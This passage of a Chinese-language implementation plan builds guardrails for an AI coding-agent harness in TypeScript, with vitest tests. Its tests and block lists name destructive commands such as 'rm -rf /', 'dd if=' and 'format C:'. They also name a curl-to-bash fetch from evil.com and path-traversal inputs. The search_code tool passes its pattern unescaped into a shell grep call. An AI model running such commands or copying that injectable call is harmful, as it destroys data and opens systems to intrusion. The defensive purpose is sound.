    expect(Blacklist.check('rm -rf /')).toBe(true);
    expect(Blacklist.check('rm -rf /etc')).toBe(true);
  });

  it('blocks format command', () => {
    expect(Blacklist.check('format C:')).toBe(true);
    expect(Blacklist.check('format d: /q')).toBe(true);
  });

  it('blocks shutdown and reboot', () => {
    expect(Blacklist.check('shutdown -h now')).toBe(true);
    expect(Blacklist.check('reboot')).toBe(true);
  });

  it('allows safe commands', () => {
    expect(Blacklist.check('ls -la')).toBe(false);
    expect(Blacklist.check('npm test')).toBe(false);
    expect(Blacklist.check('git status')).toBe(false);
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/tools.test.ts
```

- [ ] **Step 3: 实现 ToolRegistry**

创建 `src/tools/registry.ts`：

```typescript
import type { Tool, ToolDef } from '../core/types.js';

export class ToolRegistry {
  private tools: Map<string, Tool> = new Map();

  register(tool: Tool): void {
    this.tools.set(tool.name, tool);
  }

  get(name: string): Tool | undefined {
    return this.tools.get(name);
  }

  list(): Tool[] {
    return Array.from(this.tools.values());
  }

  toToolDefs(): ToolDef[] {
    return this.list().map(t => ({
      name: t.name,
      description: t.description,
      parameters: t.parameters,
      riskHint: t.riskHint,
    }));
  }
}
```

- [ ] **Step 4: 实现 ToolDispatcher**

创建 `src/tools/dispatcher.ts`：

```typescript
import type { ToolCall, ExecutionResult } from '../core/types.js';
import type { ToolRegistry } from './registry.js';
import { Blacklist } from './blacklist.js';

export class ToolDispatcher {
  static async dispatch(call: ToolCall, registry: ToolRegistry): Promise<ExecutionResult> {
    const tool = registry.get(call.name);

    if (!tool) {
      return {
        toolName: call.name,
        success: false,
        stdout: '',
        stderr: `Unknown tool: ${call.name}`,
        exitCode: 1,
      };
    }

    // 参数校验（简单 JSON Schema 校验——只校验 required 和 type）
    const validationError = ToolDispatcher.validateParams(call.arguments, tool.parameters);
    if (validationError) {
      return {
        toolName: call.name,
        success: false,
        stdout: '',
        stderr: `Parameter validation failed: ${validationError}`,
        exitCode: 1,
      };
    }

    // 硬黑名单检查（仅对 execute_shell）
    if (call.name === 'execute_shell' && typeof call.arguments.command === 'string') {
      if (Blacklist.check(call.arguments.command)) {
        return {
          toolName: call.name,
          success: false,
          stdout: '',
          stderr: `BLACKLIST BLOCK: command "${call.arguments.command}" is forbidden.`,
          exitCode: 1,
        };
      }
    }

    try {
      return await tool.execute(call.arguments);
    } catch (error) {
      return {
        toolName: call.name,
        success: false,
        stdout: '',
        stderr: `Tool execution error: ${error instanceof Error ? error.message : String(error)}`,
        exitCode: 1,
      };
    }
  }

  private static validateParams(
    args: Record<string, unknown>,
    schema: { type: 'object'; properties: Record<string, unknown>; required?: string[] },
  ): string | null {
    // 检查 required 字段
    for (const field of schema.required ?? []) {
      if (!(field in args) || args[field] === undefined) {
        return `Missing required parameter: "${field}"`;
      }
    }

    // 检查类型
    for (const [key, propSchema] of Object.entries(schema.properties)) {
      if (key in args && args[key] !== undefined) {
        const ps = propSchema as { type?: string };
        if (ps.type === 'string' && typeof args[key] !== 'string') {
          return `Parameter "${key}" must be a string, got ${typeof args[key]}`;
        }
        if (ps.type === 'number' && typeof args[key] !== 'number') {
          return `Parameter "${key}" must be a number, got ${typeof args[key]}`;
        }
      }
    }

    return null;
  }
}
```

- [ ] **Step 5: 实现 Blacklist**

创建 `src/tools/blacklist.ts`：

```typescript
const FORBIDDEN_PATTERNS: RegExp[] = [
  /rm\s+-rf\s+\//i,
  /format\s+[c-zC-Z]:/i,
  /(shutdown|reboot|halt)/i,
  /dd\s+if=/i,
  />\s*\/dev\/sd/i,
];

export class Blacklist {
  static REASON = 'This command matches a hard-blocked pattern.';

  static check(command: string): boolean {
    return FORBIDDEN_PATTERNS.some(pattern => pattern.test(command));
  }
}
```

- [ ] **Step 6: 运行测试确认通过**

```bash
npx vitest run tests/unit/tools.test.ts
```

预期：全部 7 测试通过

- [ ] **Step 7: Commit**

```bash
git checkout -b task/4-tool-system
git add src/tools/ tests/unit/tools.test.ts
git commit -m "feat(tools): add ToolRegistry, ToolDispatcher with param validation, and Blacklist"
```

---

### Task 5: 5 个内置工具

**目的：** 实现 `list_directory`、`search_code`、`read_file`、`write_file`、`execute_shell`。

**依赖：** Task 4（Tool 接口、Registry、Dispatcher、Blacklist）

**分支：** `task/5-builtin-tools`

**Files:**
- Create: `src/tools/builtin/list-directory.ts`
- Create: `src/tools/builtin/search-code.ts`
- Create: `src/tools/builtin/read-file.ts`
- Create: `src/tools/builtin/write-file.ts`
- Create: `src/tools/builtin/execute-shell.ts`
- Create: `src/tools/builtin/index.ts`（统一导出 + 注册函数）
- Create: `tests/unit/builtin-tools.test.ts`

**Interfaces:**
- Consumes: `Tool`, `ExecutionResult`, `ToolRegistry` from earlier tasks
- Produces:
  - `listDirectoryTool: Tool`
  - `searchCodeTool: Tool`
  - `readFileTool: Tool`
  - `writeFileTool: Tool`
  - `executeShellTool: Tool`
  - `registerAllTools(registry: ToolRegistry): void`

---

- [ ] **Step 1: 写失败测试（仅测试纯逻辑工具，shell 执行用 mock）**

创建 `tests/unit/builtin-tools.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { readFileTool } from '../../src/tools/builtin/read-file.js';
import { writeFileTool } from '../../src/tools/builtin/write-file.js';
import { listDirectoryTool } from '../../src/tools/builtin/list-directory.js';
import { registerAllTools } from '../../src/tools/builtin/index.js';
import { ToolRegistry } from '../../src/tools/registry.js';
import { existsSync, unlinkSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('read_file tool', () => {
  it('reads content of a file', async () => {
    const result = await readFileTool.execute({ path: 'package.json' });
    expect(result.success).toBe(true);
    expect(result.stdout).toContain('ai4se-harness');
  });

  it('returns error for nonexistent file', async () => {
    const result = await readFileTool.execute({ path: '/nonexistent/xyz.abc' });
    expect(result.success).toBe(false);
  });
});

describe('list_directory tool', () => {
  it('lists current directory', async () => {
    const result = await listDirectoryTool.execute({ path: '.' });
    expect(result.success).toBe(true);
    expect(result.stdout).toContain('package.json');
  });
});

describe('write_file + read_file round-trip', () => {
  const testFile = join(tmpdir(), 'harness-test-write.txt');

  it('writes and reads back file content', async () => {
    const writeResult = await writeFileTool.execute({ path: testFile, content: 'hello harness' });
    expect(writeResult.success).toBe(true);

    const readResult = await readFileTool.execute({ path: testFile });
    expect(readResult.stdout).toBe('hello harness');

    // cleanup
    if (existsSync(testFile)) unlinkSync(testFile);
  });
});

describe('registerAllTools', () => {
  it('registers all 5 tools', () => {
    const registry = new ToolRegistry();
    registerAllTools(registry);
    expect(registry.list().length).toBe(5);
    expect(registry.get('list_directory')).toBeDefined();
    expect(registry.get('search_code')).toBeDefined();
    expect(registry.get('read_file')).toBeDefined();
    expect(registry.get('write_file')).toBeDefined();
    expect(registry.get('execute_shell')).toBeDefined();
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/builtin-tools.test.ts
```

- [ ] **Step 3: 实现 5 个工具**

创建 `src/tools/builtin/list-directory.ts`：

```typescript
import type { Tool } from '../../core/types.js';
import { readdirSync } from 'fs';

export const listDirectoryTool: Tool = {
  name: 'list_directory',
  description: 'List contents of a directory.',
  parameters: {
    type: 'object',
    properties: {
      path: { type: 'string', description: 'Directory path to list' },
    },
    required: ['path'],
  },
  riskHint: 'low',
  async execute(args) {
    try {
      const dirPath = String(args.path);
      const entries = readdirSync(dirPath, { withFileTypes: true });
      const lines = entries.map(e => `${e.isDirectory() ? 'd' : '-'} ${e.name}`);
      return {
        toolName: 'list_directory',
        success: true,
        stdout: lines.join('\n'),
        stderr: '',
        exitCode: 0,
      };
    } catch (error) {
      return {
        toolName: 'list_directory',
        success: false,
        stdout: '',
        stderr: String(error),
        exitCode: 1,
      };
    }
  },
};
```

创建 `src/tools/builtin/search-code.ts`：

```typescript
import type { Tool } from '../../core/types.js';
import { execSync } from 'child_process';

export const searchCodeTool: Tool = {
  name: 'search_code',
  description: 'Search codebase using grep. Provide a regex pattern.',
  parameters: {
    type: 'object',
    properties: {
      pattern: { type: 'string', description: 'Regex pattern to search for' },
      path: { type: 'string', description: 'Directory to search in (default: .)' },
    },
    required: ['pattern'],
  },
  riskHint: 'low',
  async execute(args) {
    try {
      const pattern = String(args.pattern);
      const dir = String(args.path ?? '.');
      const result = execSync(`grep -rn "${pattern}" "${dir}" --include="*.ts" --include="*.js" 2>/dev/null || echo "No matches found"`, {
        encoding: 'utf-8',
        timeout: 10000,
        shell: true,
      });
      return {
        toolName: 'search_code',
        success: true,
        stdout: result.trim(),
        stderr: '',
        exitCode: 0,
      };
    } catch (error) {
      return {
        toolName: 'search_code',
        success: false,
        stdout: '',
        stderr: String(error),
        exitCode: 1,
      };
    }
  },
};
```

创建 `src/tools/builtin/read-file.ts`：

```typescript
import type { Tool } from '../../core/types.js';
import { readFileSync } from 'fs';

export const readFileTool: Tool = {
  name: 'read_file',
  description: 'Read the entire content of a file.',
  parameters: {
    type: 'object',
    properties: {
      path: { type: 'string', description: 'File path to read' },
    },
    required: ['path'],
  },
  riskHint: 'low',
  async execute(args) {
    try {
      const content = readFileSync(String(args.path), 'utf-8');
      return {
        toolName: 'read_file',
        success: true,
        stdout: content,
        stderr: '',
        exitCode: 0,
      };
    } catch (error) {
      return {
        toolName: 'read_file',
        success: false,
        stdout: '',
        stderr: String(error),
        exitCode: 1,
      };
    }
  },
};
```

创建 `src/tools/builtin/write-file.ts`：

```typescript
import type { Tool } from '../../core/types.js';
import { writeFileSync, mkdirSync } from 'fs';
import { dirname } from 'path';

export const writeFileTool: Tool = {
  name: 'write_file',
  description: 'Create or overwrite a file with given content.',
  parameters: {
    type: 'object',
    properties: {
      path: { type: 'string', description: 'File path to write' },
      content: { type: 'string', description: 'Content to write' },
    },
    required: ['path', 'content'],
  },
  riskHint: 'medium',
  async execute(args) {
    try {
      const filePath = String(args.path);
      const content = String(args.content);
      mkdirSync(dirname(filePath), { recursive: true });
      writeFileSync(filePath, content, 'utf-8');
      return {
        toolName: 'write_file',
        success: true,
        stdout: `File written: ${filePath} (${content.length} bytes)`,
        stderr: '',
        exitCode: 0,
      };
    } catch (error) {
      return {
        toolName: 'write_file',
        success: false,
        stdout: '',
        stderr: String(error),
        exitCode: 1,
      };
    }
  },
};
```

创建 `src/tools/builtin/execute-shell.ts`：

```typescript
import type { Tool } from '../../core/types.js';
import { execSync } from 'child_process';

export const executeShellTool: Tool = {
  name: 'execute_shell',
  description: 'Execute a shell command. Returns stdout, stderr, and exit code.',
  parameters: {
    type: 'object',
    properties: {
      command: { type: 'string', description: 'Shell command to execute' },
      cwd: { type: 'string', description: 'Working directory (default: current)' },
    },
    required: ['command'],
  },
  riskHint: 'high',
  async execute(args) {
    try {
      const command = String(args.command);
      const cwd = args.cwd ? String(args.cwd) : undefined;
      const result = execSync(command, {
        encoding: 'utf-8',
        timeout: 30000,
        cwd,
        shell: true,
      });
      return {
        toolName: 'execute_shell',
        success: true,
        stdout: result,
        stderr: '',
        exitCode: 0,
      };
    } catch (error: any) {
      return {
        toolName: 'execute_shell',
        success: false,
        stdout: error.stdout ?? '',
        stderr: error.stderr ?? String(error),
        exitCode: error.status ?? 1,
      };
    }
  },
};
```

创建 `src/tools/builtin/index.ts`：

```typescript
import type { ToolRegistry } from '../registry.js';
import { listDirectoryTool } from './list-directory.js';
import { searchCodeTool } from './search-code.js';
import { readFileTool } from './read-file.js';
import { writeFileTool } from './write-file.js';
import { executeShellTool } from './execute-shell.js';

export function registerAllTools(registry: ToolRegistry): void {
  registry.register(listDirectoryTool);
  registry.register(searchCodeTool);
  registry.register(readFileTool);
  registry.register(writeFileTool);
  registry.register(executeShellTool);
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/builtin-tools.test.ts
```

预期：全部 4 测试通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/5-builtin-tools
git add src/tools/builtin/ tests/unit/builtin-tools.test.ts
git commit -m "feat(tools): add 5 built-in tools (list_directory, search_code, read_file, write_file, execute_shell)"
```

---

### Task 6: 护栏引擎

**目的：** 实现护栏的风险评估引擎——根据工具名和参数动态判定风险等级。这是深度维度（治理）的第一步。

**依赖：** Task 0（核心类型），Task 2（配置加载）

**分支：** `task/6-guardrails-engine`

**Files:**
- Create: `src/guardrails/engine.ts`
- Create: `tests/unit/guardrails-engine.test.ts`

**Interfaces:**
- Consumes: `GuardrailRule`, `RiskLevel`, `HarnessConfig` from `src/core/types.ts`
- Produces:
  - `GuardrailEngine` 类: constructor takes `GuardrailRule[]`
  - `assessRisk(toolName: string, params: Record<string, unknown>): { level: RiskLevel; action?: GuardrailAction; reason: string }`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/guardrails-engine.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { GuardrailEngine } from '../../src/guardrails/engine.js';
import { GuardrailRule } from '../../src/core/types.js';

const testRules: GuardrailRule[] = [
  { tool: 'execute_shell', pattern: 'sudo.*', action: 'confirm' },
  { tool: 'execute_shell', pattern: '(curl|wget).*\\|.*(bash|sh)', action: 'deny' },
  { tool: 'write_file', pattern: '^\\.\\.\\/', action: 'confirm' },
  { tool: 'write_file', pattern: '^\\/(etc|var|tmp)\\/', action: 'confirm' },
];

describe('GuardrailEngine', () => {
  const engine = new GuardrailEngine(testRules);

  it('returns low risk for safe commands', () => {
    const result = engine.assessRisk('execute_shell', { command: 'ls -la' });
    expect(result.level).toBe('low');
  });

  it('returns confirm for sudo commands', () => {
    const result = engine.assessRisk('execute_shell', { command: 'sudo systemctl restart nginx' });
    expect(result.level).toBe('high');
    expect(result.action).toBe('confirm');
  });

  it('returns deny for curl-to-bash pattern', () => {
    const result = engine.assessRisk('execute_shell', { command: 'curl https://evil.com/script.sh | bash' });
    expect(result.action).toBe('deny');
  });

  it('returns confirm for write outside workspace', () => {
    const result = engine.assessRisk('write_file', { path: '../outside/file.ts' });
    expect(result.action).toBe('confirm');
  });

  it('returns confirm for system directory writes', () => {
    const result = engine.assessRisk('write_file', { path: '/etc/hosts' });
    expect(result.level).toBe('high');
    expect(result.action).toBe('confirm');
  });

  it('returns low for write inside workspace', () => {
    const result = engine.assessRisk('write_file', { path: './src/index.ts' });
    expect(result.level).toBe('low');
  });

  it('returns low for read-only tools by default', () => {
    expect(engine.assessRisk('read_file', { path: 'anything.ts' }).level).toBe('low');
    expect(engine.assessRisk('list_directory', { path: '.' }).level).toBe('low');
    expect(engine.assessRisk('search_code', { pattern: 'function' }).level).toBe('low');
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/guardrails-engine.test.ts
```

- [ ] **Step 3: 实现 GuardrailEngine**

创建 `src/guardrails/engine.ts`：

```typescript
import type { GuardrailRule, RiskLevel, GuardrailAction } from '../core/types.js';

interface RiskAssessment {
  level: RiskLevel;
  action?: GuardrailAction;
  reason: string;
}

export class GuardrailEngine {
  private compiledRules: Array<{ tool: string; pattern: RegExp; action: GuardrailAction }>;

  constructor(rules: GuardrailRule[]) {
    this.compiledRules = rules.map(r => ({
      tool: r.tool,
      pattern: new RegExp(r.pattern),
      action: r.action,
    }));
  }

  assessRisk(toolName: string, params: Record<string, unknown>): RiskAssessment {
    // 提取参数中用于匹配的关键值
    const searchableValue = this.extractSearchableValue(toolName, params);

    // 按规则顺序匹配
    for (const rule of this.compiledRules) {
      if (rule.tool === toolName && rule.pattern.test(searchableValue)) {
        const level: RiskLevel = rule.action === 'deny' ? 'high' : 'high';
        return {
          level,
          action: rule.action,
          reason: `Matched rule: ${rule.tool} /${rule.pattern.source}/ → ${rule.action}`,
        };
      }
    }

    // 默认：基于工具类型给基础风险等级
    const defaultLevel = this.defaultRisk(toolName);
    return { level: defaultLevel, reason: `Default risk for ${toolName}: ${defaultLevel}` };
  }

  private extractSearchableValue(toolName: string, params: Record<string, unknown>): string {
    switch (toolName) {
      case 'execute_shell':
        return String(params.command ?? '');
      case 'write_file':
        return String(params.path ?? '');
      default:
        return '';
    }
  }

  private defaultRisk(toolName: string): RiskLevel {
    switch (toolName) {
      case 'execute_shell': return 'medium';
      case 'write_file': return 'low';
      default: return 'low';
    }
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/guardrails-engine.test.ts
```

预期：7/7 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/6-guardrails-engine
git add src/guardrails/ tests/unit/guardrails-engine.test.ts
git commit -m "feat(guardrails): add GuardrailEngine with dynamic risk assessment"
```

---

### Task 7: HITL 状态机

**目的：** 实现人机交互审批状态机——IDLE ↔ WAITING → APPROVED/DENIED/TIMEOUT。

**依赖：** Task 0（核心类型）

**分支：** `task/7-hitl-state-machine`

**Files:**
- Create: `src/guardrails/hitl.ts`
- Create: `tests/unit/hitl.test.ts`

**Interfaces:**
- Consumes: `HITLRequest`, `HITLStatus` from `src/core/types.ts`
- Produces:
  - `HITLStateMachine` 类: `submit(request): void`, `approve(id): boolean`, `deny(id): boolean`, `checkTimeout(): HITLRequest[]`, `getPending(): HITLRequest[]`
  - 事件回调: `onRequest?: (req: HITLRequest) => void`, `onResolved?: (req: HITLRequest) => void`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/hitl.test.ts`：

```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { HITLStateMachine } from '../../src/guardrails/hitl.js';
import { HITLRequest } from '../../src/core/types.js';

function makeRequest(id: string, timeout: number = 60): HITLRequest {
  return {
    id,
    toolName: 'execute_shell',
    params: { command: 'rm important.txt' },
    risk: 'high',
    reason: 'Matches dangerous pattern',
    status: 'WAITING',
    createdAt: Date.now(),
    timeoutSeconds: timeout,
  };
}

describe('HITLStateMachine', () => {
  let hitl: HITLStateMachine;

  beforeEach(() => {
    hitl = new HITLStateMachine();
  });

  it('starts with empty queue', () => {
    expect(hitl.getPending()).toHaveLength(0);
  });

  it('submits a request and fires callback', () => {
    const callback = vi.fn();
    hitl.onRequest = callback;

    const req = makeRequest('1');
    hitl.submit(req);

    expect(hitl.getPending()).toHaveLength(1);
    expect(callback).toHaveBeenCalledWith(req);
  });

  it('approves a pending request', () => {
    hitl.submit(makeRequest('1'));
    const result = hitl.approve('1');

    expect(result).toBe(true);
    expect(hitl.getPending()).toHaveLength(0);
  });

  it('denies a pending request', () => {
    hitl.submit(makeRequest('1'));
    const result = hitl.deny('1');

    expect(result).toBe(true);
    expect(hitl.getPending()).toHaveLength(0);
  });

  it('returns false for unknown request id', () => {
    expect(hitl.approve('nonexistent')).toBe(false);
    expect(hitl.deny('nonexistent')).toBe(false);
  });

  it('times out expired requests', () => {
    // 创建一个已经过期的请求
    const expiredReq = makeRequest('2', -1); // 负超时 → 立即过期
    hitl.submit(expiredReq);

    const timedOut = hitl.checkTimeout();
    expect(timedOut).toHaveLength(1);
    expect(timedOut[0].status).toBe('TIMEOUT');
    expect(hitl.getPending()).toHaveLength(0);
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/hitl.test.ts
```

- [ ] **Step 3: 实现 HITLStateMachine**

创建 `src/guardrails/hitl.ts`：

```typescript
import type { HITLRequest } from '../core/types.js';

export class HITLStateMachine {
  private pending: Map<string, HITLRequest> = new Map();
  onRequest?: (req: HITLRequest) => void;
  onResolved?: (req: HITLRequest) => void;

  submit(request: HITLRequest): void {
    request.status = 'WAITING';
    request.createdAt = Date.now();
    this.pending.set(request.id, request);
    this.onRequest?.(request);
  }

  approve(id: string): boolean {
    const req = this.pending.get(id);
    if (!req || req.status !== 'WAITING') return false;

    req.status = 'APPROVED';
    this.pending.delete(id);
    this.onResolved?.(req);
    return true;
  }

  deny(id: string): boolean {
    const req = this.pending.get(id);
    if (!req || req.status !== 'WAITING') return false;

    req.status = 'DENIED';
    this.pending.delete(id);
    this.onResolved?.(req);
    return true;
  }

  getPending(): HITLRequest[] {
    return Array.from(this.pending.values()).filter(r => r.status === 'WAITING');
  }

  checkTimeout(): HITLRequest[] {
    const now = Date.now();
    const timedOut: HITLRequest[] = [];

    for (const [id, req] of this.pending) {
      if (req.status !== 'WAITING') continue;
      if (now - req.createdAt > req.timeoutSeconds * 1000) {
        req.status = 'TIMEOUT';
        timedOut.push(req);
        this.pending.delete(id);
        this.onResolved?.(req);
      }
    }

    return timedOut;
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/hitl.test.ts
```

预期：6/6 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/7-hitl-state-machine
git add src/guardrails/hitl.ts tests/unit/hitl.test.ts
git commit -m "feat(guardrails): add HITL state machine (IDLE → WAITING → APPROVED/DENIED/TIMEOUT)"
```

---

### Task 8: 范围围栏（Scope Fence）

**目的：** 实现工作区边界控制——路径前缀校验 + 主机白名单比对。

**依赖：** Task 0（核心类型）

**分支：** `task/8-scope-fence`

**Files:**
- Create: `src/guardrails/scope-fence.ts`
- Create: `tests/unit/scope-fence.test.ts`

**Interfaces:**
- Consumes: `ScopeFence` from `src/core/types.ts`
- Produces:
  - `ScopeFenceGuard` 类: constructor takes `ScopeFence`
  - `validatePath(path: string): { allowed: boolean; reason?: string }`
  - `validateHost(url: string): { allowed: boolean; reason?: string }`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/scope-fence.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { ScopeFenceGuard } from '../../src/guardrails/scope-fence.js';
import { ScopeFence } from '../../src/core/types.js';
import { resolve } from 'path';

describe('ScopeFenceGuard', () => {
  const fence = new ScopeFenceGuard({
    workspaceRoot: '.',
    allowedHosts: ['github.com'],
    maxShellTimeMs: 30000,
  });

  it('allows paths inside workspace root', () => {
    expect(fence.validatePath('./src/index.ts').allowed).toBe(true);
    expect(fence.validatePath('src/index.ts').allowed).toBe(true);
  });

  it('rejects paths outside workspace root', () => {
    const result = fence.validatePath('/etc/hosts');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('outside workspace');
  });

  it('rejects parent directory traversal', () => {
    const result = fence.validatePath('../../../etc/passwd');
    expect(result.allowed).toBe(false);
  });

  it('allows allowed hosts', () => {
    expect(fence.validateHost('github.com').allowed).toBe(true);
  });

  it('rejects unknown hosts', () => {
    const result = fence.validateHost('evil.example.com');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('not in allowed hosts');
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/scope-fence.test.ts
```

- [ ] **Step 3: 实现**

创建 `src/guardrails/scope-fence.ts`：

```typescript
import type { ScopeFence } from '../core/types.js';
import { resolve, isAbsolute, relative } from 'path';

export class ScopeFenceGuard {
  private workspaceRoot: string;
  private allowedHosts: string[];
  readonly maxShellTimeMs: number;

  constructor(config: ScopeFence) {
    this.workspaceRoot = resolve(config.workspaceRoot);
    this.allowedHosts = config.allowedHosts;
    this.maxShellTimeMs = config.maxShellTimeMs;
  }

  validatePath(targetPath: string): { allowed: boolean; reason?: string } {
    // 解析为绝对路径
    const resolved = isAbsolute(targetPath) ? targetPath : resolve(targetPath);

    // 检查是否在 workspaceRoot 内
    const rel = relative(this.workspaceRoot, resolved);

    if (rel.startsWith('..') || isAbsolute(rel)) {
      return {
        allowed: false,
        reason: `Path "${targetPath}" is outside workspace root "${this.workspaceRoot}".`,
      };
    }

    return { allowed: true };
  }

  validateHost(host: string): { allowed: boolean; reason?: string } {
    const normalized = host.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];

    if (this.allowedHosts.includes(normalized)) {
      return { allowed: true };
    }

    return {
      allowed: false,
      reason: `Host "${normalized}" is not in allowed hosts: [${this.allowedHosts.join(', ')}].`,
    };
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/scope-fence.test.ts
```

预期：5/5 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/8-scope-fence
git add src/guardrails/scope-fence.ts tests/unit/scope-fence.test.ts
git commit -m "feat(guardrails): add ScopeFenceGuard for workspace boundary enforcement"
```

---

### Task 9: 记忆管理

**目的：** 实现会话/项目/决策三类记忆的存储与检索，含 maxTokens 截断。

**依赖：** Task 0（核心类型）

**分支：** `task/9-memory-store`

**Files:**
- Create: `src/memory/store.ts`
- Create: `tests/unit/memory.test.ts`

**Interfaces:**
- Consumes: `MemoryEntry`, `DecisionRecord` from `src/core/types.ts`
- Produces:
  - `MemoryStore` 类: `set(key, value, category)`, `get(key)`, `all(category?)`, `summarize()`, `recordDecision(record)`, `findDecision(toolName, commandFingerprint)`, `getAllDecisions(): DecisionRecord[]`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/memory.test.ts`：

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { MemoryStore } from '../../src/memory/store.js';

describe('MemoryStore', () => {
  let store: MemoryStore;

  beforeEach(() => {
    store = new MemoryStore({ maxTokens: 2000, summaryInterval: 10, contextThreshold: 0.8 });
  });

  it('stores and retrieves an entry', () => {
    store.set('coding-style', 'Use tabs for indentation', 'project');
    const entry = store.get('coding-style');
    expect(entry?.value).toBe('Use tabs for indentation');
    expect(entry?.category).toBe('project');
  });

  it('returns all entries of a category', () => {
    store.set('a', 'valueA', 'project');
    store.set('b', 'valueB', 'decision');

    expect(store.all('project')).toHaveLength(1);
    expect(store.all('decision')).toHaveLength(1);
    expect(store.all()).toHaveLength(2);
  });

  it('records and matches decisions by fingerprint', () => {
    store.recordDecision({ toolName: 'execute_shell', commandFingerprint: 'npm run deploy', action: 'approved', timestamp: Date.now() });
    store.recordDecision({ toolName: 'execute_shell', commandFingerprint: 'rm -rf /tmp', action: 'denied', timestamp: Date.now() });

    // 精确匹配
    const found = store.findDecision('execute_shell', 'npm run deploy');
    expect(found?.action).toBe('approved');

    // 不匹配
    const notFound = store.findDecision('execute_shell', 'npm run build');
    expect(notFound).toBeNull();
  });

  it('summarizes memory as text', () => {
    store.set('key1', 'Remember to use async/await', 'project');
    store.set('key2', 'Tests use vitest', 'project');

    const summary = store.summarize();
    expect(summary).toContain('Remember to use async/await');
    expect(summary).toContain('Tests use vitest');
  });
});
```

- [ ] **Step 2: 运行确认失败**

```bash
npx vitest run tests/unit/memory.test.ts
```

- [ ] **Step 3: 实现 MemoryStore**

创建 `src/memory/store.ts`：

```typescript
import type { MemoryEntry, DecisionRecord } from '../core/types.js';

interface MemoryConfig {
  maxTokens: number;
  summaryInterval: number;
  contextThreshold: number;
}

export class MemoryStore {
  private entries: Map<string, MemoryEntry> = new Map();
  decisions: DecisionRecord[] = [];
  private config: MemoryConfig;

  constructor(config: MemoryConfig) {
    this.config = config;
  }

  set(key: string, value: string, category: 'project' | 'decision'): void {
    this.entries.set(key, {
      key,
      value,
      category,
      updatedAt: Date.now(),
    });
  }

  get(key: string): MemoryEntry | undefined {
    return this.entries.get(key);
  }

  all(category?: 'project' | 'decision'): MemoryEntry[] {
    const all = Array.from(this.entries.values());
    if (category) {
      return all.filter(e => e.category === category);
    }
    return all;
  }

  /**
   * 生成记忆摘要字符串，用于注入 system prompt。
   * 按 maxTokens 估算截断（1 token ≈ 4 字符的粗略估算）。
   */
  summarize(): string {
    const entries = Array.from(this.entries.values())
      .sort((a, b) => b.updatedAt - a.updatedAt);

    const maxChars = this.config.maxTokens * 4;
    let totalChars = 0;
    const lines: string[] = [];

    for (const entry of entries) {
      const line = `[${entry.category}] ${entry.key}: ${entry.value}`;
      totalChars += line.length;
      if (totalChars > maxChars) break;
      lines.push(line);
    }

    return lines.join('\n');
  }

  recordDecision(record: DecisionRecord): void {
    this.decisions.push(record);
  }

  /**
   * 两级指纹匹配：
   * - 精确匹配：commandFingerprint 完全相同 → 复用历史决策
   * - 模糊匹配暂不实现（后续 task 由 fingerprint 模块接管）
   */
  findDecision(toolName: string, commandFingerprint: string): DecisionRecord | null {
    // 精确匹配
    const exact = this.decisions.find(
      d => d.toolName === toolName && d.commandFingerprint === commandFingerprint,
    );
    if (exact) return exact;

    return null;
  }

  /** 返回所有决策记录，供 DecisionFingerprint 使用 */
  getAllDecisions(): DecisionRecord[] {
    return [...this.decisions];
  }
}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
npx vitest run tests/unit/memory.test.ts
```

预期：4/4 通过

- [ ] **Step 5: Commit**

```bash
git checkout -b task/9-memory-store
git add src/memory/ tests/unit/memory.test.ts
git commit -m "feat(memory): add MemoryStore with truncated summary and decision recording"
```

---

### Task 10: 决策指纹匹配器

**目的：** 实现两级匹配——精确匹配 vs 模糊匹配（命令相似度）。

**依赖：** Task 9（MemoryStore 提供决策存储）

**分支：** `task/10-decision-fingerprint`

**Files:**
- Create: `src/guardrails/fingerprint.ts`
- Create: `tests/unit/fingerprint.test.ts`

**Interfaces:**
- Consumes: `MemoryStore` from Task 9
- Produces:
  - `DecisionFingerprint.match(store: MemoryStore, toolName: string, commandFingerprint: string): { matched: boolean; level: 'exact' | 'fuzzy' | 'none'; previousAction?: 'approved' | 'denied' }`

---

- [ ] **Step 1: 写失败测试**

创建 `tests/unit/fingerprint.test.ts`：

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { MemoryStore } from '../../src/memory/store.js';
import { DecisionFingerprint } from '../../src/guardrails/fingerprint.js';

const memConfig = { maxTokens: 2000, summaryInterval: 10, contextThreshold: 0.8 };

describe('DecisionFingerprint', () => {
  let store: MemoryStore;

  beforeEach(() => {
    store = new MemoryStore(memConfig);
  });

  it('returns exact match when identical command is found', () => {
    store.recordDecision({
      toolName: 'execute_shell',
      commandFingerprint: 'npm run deploy',
      action: 'approved',
      timestamp: Date.now(),
    });

    const result = DecisionFingerprint.match(store, 'execute_shell', 'npm run deploy');
    expect(result.matched).toBe(true);
    expect(result.level).toBe('exact');
    expect(result.previousAction).toBe('approved');
  });

